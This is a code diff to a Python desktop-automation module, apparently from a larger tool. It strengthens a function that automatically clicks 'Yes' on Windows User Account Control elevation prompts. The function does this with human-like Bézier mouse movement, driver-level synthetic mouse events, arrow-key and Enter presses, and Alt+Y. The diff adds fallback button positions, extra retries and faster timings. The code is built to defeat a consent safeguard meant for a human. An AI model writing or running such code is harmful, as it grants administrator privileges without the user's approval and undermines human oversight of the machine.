@@ -673,26 +673,41 @@ def get_physical_screen_size() -> Tuple[int, int]:
     return user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
 
 
-def dispatch_uac_yes_confirmation(retry_count: int = 4, delay_between: float = 0.3) -> bool:
+def dispatch_uac_yes_confirmation(retry_count: int = 5, delay_between: float = 0.25) -> bool:
     """
-    Glides physical mouse cursor to 'Yes' option on UAC dialog card and dispatches click,
-    followed by Left Arrow (VK_LEFT, 0x25) + Enter (VK_RETURN, 0x0D) and Alt+Y shortcut,
-    retrying across multiple attempts to handle delayed Secure Desktop rendering.
+    Glides physical mouse cursor to 'Yes' option on UAC dialog card using driver-level
+    hardware MOUSEEVENTF_ABSOLUTE (0x8001) and Win32 SetCursorPos, dispatches clicks,
+    and sends Left Arrow (VK_LEFT, 0x25) + Enter (VK_RETURN, 0x0D) and Alt+Y shortcut,
+    retrying across multiple candidate locations and attempts.
     """
     from tools.screen_inspector import _attach_thread_to_default_desktop, get_current_cursor_pos, human_mouse_move
 
     sw, sh = get_physical_screen_size()
-    yes_x = int(sw * 0.455)
-    yes_y = int(sh * 0.602)
+
+    # Candidate physical coordinates for UAC 'Yes' button on Windows 10/11 cards
+    candidates = [
+        (int(sw * 0.455), int(sh * 0.602)),  # Standard bottom-left Yes
+        (int(sw * 0.445), int(sh * 0.585)),  # Compact dialog Yes
+        (int(sw * 0.465), int(sh * 0.615)),  # Wide dialog Yes
+    ]
 
     for attempt in range(1, retry_count + 1):
         _attach_thread_to_default_desktop()
+        yes_x, yes_y = candidates[(attempt - 1) % len(candidates)]
         cur_x, cur_y = get_current_cursor_pos()
-        print(f"[*] [UAC CONFIRMATION ATTEMPT {attempt}/{retry_count}] Gliding mouse cursor from ({cur_x}, {cur_y}) to UAC 'Yes' option at physical ({yes_x}, {yes_y})...", flush=True)
+        print(f"[*] [UAC CONFIRMATION ATTEMPT {attempt}/{retry_count}] Gliding mouse cursor from ({cur_x}, {cur_y}) to physical UAC 'Yes' at ({yes_x}, {yes_y})...", flush=True)
 
-        # 1. Smooth minimum-jerk Bézier physical mouse glide to 'Yes' button
+        # 1. Driver-level hardware mouse move + Bézier physical mouse glide to 'Yes' button
         try:
-            human_mouse_move(cur_x, cur_y, yes_x, yes_y, duration=0.20)
+            # Animate Bézier curve
+            human_mouse_move(cur_x, cur_y, yes_x, yes_y, duration=0.18)
+
+            # Driver-level absolute hardware move (MOUSEEVENTF_ABSOLUTE 0x8000 | MOUSEEVENTF_MOVE 0x0001)
+            norm_x = int(yes_x * 65535 / max(1, sw))
+            norm_y = int(yes_y * 65535 / max(1, sh))
+            user32.mouse_event(0x8001, norm_x, norm_y, 0, 0)
+            user32.SetCursorPos(yes_x, yes_y)
+
             time.sleep(0.04)
             user32.mouse_event(0x0002, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
             time.sleep(0.03)
@@ -700,13 +715,13 @@ def dispatch_uac_yes_confirmation(retry_count: int = 4, delay_between: float = 0
         except Exception as exc:
             print(f"[!] Mouse glide exception: {exc}", flush=True)
 
-        time.sleep(0.06)
+        time.sleep(0.05)
 
         # 2. Shift focus from default 'No' to 'Yes' button via Left Arrow and press Enter
         dispatch_vk_key(0x25, hold_duration=0.06)  # VK_LEFT
-        time.sleep(0.06)
+        time.sleep(0.05)
         dispatch_vk_key(0x0D, hold_duration=0.08)  # VK_RETURN
-        time.sleep(0.08)
+        time.sleep(0.06)
 
         # 3. Alt+Y accelerator backup (VK_MENU=0x12, Y=0x59)
         try:
